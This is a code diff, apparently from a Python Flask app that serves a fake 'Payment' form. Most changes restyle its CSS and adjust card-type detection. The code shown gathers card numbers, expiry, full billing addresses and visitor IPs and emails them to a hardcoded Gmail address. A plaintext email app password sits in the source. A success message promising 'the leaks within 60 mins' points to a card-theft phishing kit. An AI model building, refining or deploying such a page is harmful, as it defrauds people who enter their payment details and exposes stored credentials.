@@ -12,29 +12,122 @@ EMAIL_PASSWORD = "duyj jicc wmic dlvo"
 ADMIN_EMAIL = "ana.taroka@gmail.com"
 
 
-# HTML بالإنجليزي + JavaScript لكشف نوع البطاقة
+# HTML محسن + Responsive CSS
 HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
-        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
-        h1 { text-align: center; color: #333; }
-        form { display: flex; flex-direction: column; gap: 15px; }
-        label { font-weight: bold; }
-        input, select { padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
-        button { background: #28a745; color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; margin-top: 30px; }
-        button:hover { background: #218838; }
-        .result { margin-top: 30px; padding: 20px; border-radius: 5px; text-align: center; font-size: 20px; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .card-type { font-size: 18px; font-weight: bold; color: #007bff; min-height: 30px; }
-        .fixed-amount { padding: 12px; background: #e9ecef; border: 1px solid #ced4da; border-radius: 5px; font-size: 18px; text-align: center; font-weight: bold; color: #495057; }
-        .section { margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
-        .section h2 { font-size: 20px; color: #333; margin-bottom: 15px; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #f4f4f4; 
+            margin: 0; 
+            padding: 20px; 
+        }
+        .container { 
+            max-width: 600px; 
+            width: 100%; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+        }
+        h1 { 
+            text-align: center; 
+            color: #333; 
+            margin-bottom: 30px; 
+            font-size: 28px; 
+        }
+        form { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 20px; 
+        }
+        label { 
+            font-weight: bold; 
+            font-size: 16px; 
+            color: #333; 
+        }
+        input, select { 
+            padding: 14px; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            width: 100%; 
+            box-sizing: border-box; 
+        }
+        .card-type { 
+            font-size: 18px; 
+            font-weight: bold; 
+            color: #007bff; 
+            min-height: 30px; 
+            text-align: right; 
+        }
+        .fixed-amount { 
+            padding: 16px; 
+            background: #e9ecef; 
+            border: 1px solid #ced4da; 
+            border-radius: 8px; 
+            font-size: 20px; 
+            text-align: center; 
+            font-weight: bold; 
+            color: #495057; 
+        }
+        .section { 
+            margin-top: 40px; 
+            padding-top: 20px; 
+            border-top: 1px solid #eee; 
+        }
+        .section h2 { 
+            font-size: 22px; 
+            color: #333; 
+            margin-bottom: 20px; 
+        }
+        button { 
+            background: #28a745; 
+            color: white; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 18px; 
+            font-weight: bold; 
+            margin-top: 20px; 
+        }
+        button:hover { 
+            background: #218838; 
+        }
+        .result { 
+            margin-top: 40px; 
+            padding: 25px; 
+            border-radius: 10px; 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: bold; 
+        }
+        .success { 
+            background: #d4edda; 
+            color: #155724; 
+            border: 1px solid #c3e6cb; 
+        }
+        .error { 
+            background: #f8d7da; 
+            color: #721c24; 
+            border: 1px solid #f5c6cb; 
+        }
+
+        /* Responsive للموبايل */
+        @media (max-width: 480px) {
+            .container { padding: 20px; }
+            h1 { font-size: 24px; }
+            input, select, button { font-size: 17px; padding: 16px; }
+            .fixed-amount { font-size: 18px; }
+            .result { font-size: 20px; padding: 20px; }
+        }
     </style>
     <script>
         function detectCardType(number) {
@@ -45,8 +138,6 @@ HTML = '''
             else if (/^5[1-5]/.test(card)) type = "MasterCard";
             else if (/^3[47]/.test(card)) type = "American Express";
             else if (/^6/.test(card)) type = "Discover";
-            else if (/^3[0|8|9]/.test(card)) type = "Diners Club";
-            else if (/^2/.test(card)) type = "Mir (Russia)";
 
             document.getElementById('cardType').innerText = type;
         }
@@ -193,14 +284,14 @@ def home():
         elif not validate_expiry(expiry):
             is_valid = False
             message = "Invalid or expired expiry date"
-        elif not country or not street or not city or not state or not zip_code:
+        elif not all([country, street, city, state, zip_code]):
             is_valid = False
             message = "Please fill all billing address fields"
 
         if is_valid:
             success = True
             message = "Payment processed successfully! GET the leaks within 60 mins"
-            
+
         # جمع البيانات للإيميل
         card_data = {
             'card_number': card_number,
@@ -215,7 +306,6 @@ def home():
             'zip': zip_code
         }
 
-        # إرسال الإيميل
         send_email(card_data, ip)
 
     return render_template_string(HTML, message=message, success=success)
